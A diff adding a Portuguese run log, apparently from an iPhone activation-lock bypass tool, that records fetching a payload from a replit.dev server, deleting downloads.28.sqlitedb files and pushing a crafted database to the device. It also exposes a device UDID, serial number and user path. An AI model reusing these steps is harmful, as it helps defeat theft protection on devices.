@@ -1,0 +1,63 @@
+═══════════════════════════════════════════════════════════════════
+NORMAL LOG
+═══════════════════════════════════════════════════════════════════
+
+[*] Gerando payload Hello Activation...
+═══════════════════════════════════════════════════════
+[INIT] SEQUÊNCIA DE ATIVAÇÃO INICIADA
+═══════════════════════════════════════════════════════
+[*] PHASE 1: Reboot Inicial
+[*] PHASE 2: Extraindo GUID do Syslog
+[AVISO] GUID não encontrado, usando UDID
+[OK] GUID: 00008101-001E40313EC0001E
+[*] PHASE 3: Requisitando Payload do Servidor
+[OK] Payload URL: http://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev/cache/stage3/f23b00a67f902269/payload.png
+[*] PHASE 4: Baixando Payload
+[OK] Payload baixado: 16384 bytes
+[*] PHASE 4.5: Aguardando reconexão do dispositivo...
+[*] Aguardando... (1/15)
+[*] Aguardando... (2/15)
+[*] Aguardando... (3/15)
+[*] Aguardando... (4/15)
+[*] Aguardando... (5/15)
+[*] Aguardando... (6/15)
+[OK] Dispositivo reconectado! (tentativa 7/15)
+[*] PHASE 5: Limpando Arquivos Antigos
+[*] PHASE 6: Injetando Payload
+[OK] Payload injetado
+[*] PHASE 7: Reboot Pós-Injeção
+[*] Aguardando 30 segundos para dispositivo reconectar...
+[*] PHASE 8: Aguardando Metadados
+[AVISO] Metadados não encontrados
+[*] PHASE 9: Reboot Final
+═══════════════════════════════════════════════════════
+[✓] SEQUÊNCIA CONCLUÍDA COM SUCESSO!
+═══════════════════════════════════════════════════════
+
+
+═══════════════════════════════════════════════════════════════════
+DEBUG LOG
+═══════════════════════════════════════════════════════════════════
+
+[DEBUG] CMD: reboot --udid 00008101-001E40313EC0001E
+[DEBUG] ExitCode: 0
+[DEBUG] Error: {"level":"info","msg":"ok","time":"2025-11-24T22:48:22-03:00"}
+
+[DEBUG] Servidor selecionado: https://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev
+[DEBUG] URL: https://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev/?prd=iPhone13,2&guid=00008101-001E40313EC0001E&sn=FFMDJ0ES0F00
+[DEBUG] CMD: fsync --udid 00008101-001E40313EC0001E rm --path "/Downloads/downloads.28.sqlitedb"
+[DEBUG] ExitCode: 0
+[DEBUG] CMD: fsync --udid 00008101-001E40313EC0001E rm --path "/Downloads/downloads.28.sqlitedb-shm"
+[DEBUG] ExitCode: 0
+[DEBUG] CMD: fsync --udid 00008101-001E40313EC0001E rm --path "/Downloads/downloads.28.sqlitedb-wal"
+[DEBUG] ExitCode: 0
+[DEBUG] CMD: fsync --udid 00008101-001E40313EC0001E push --srcPath="C:\Users\Tributos Consultoria\AppData\Local\Temp\iOSPayload\payload.db" --dstPath="/Downloads/downloads.28.sqlitedb"
+[DEBUG] ExitCode: 0
+[DEBUG] CMD: reboot --udid 00008101-001E40313EC0001E
+[DEBUG] ExitCode: 0
+[DEBUG] Error: {"level":"info","msg":"ok","time":"2025-11-24T22:49:01-03:00"}
+
+[DEBUG] CMD: reboot --udid 00008101-001E40313EC0001E
+[DEBUG] ExitCode: 0
+[DEBUG] Error: {"level":"info","msg":"ok","time":"2025-11-24T22:50:02-03:00"}
+
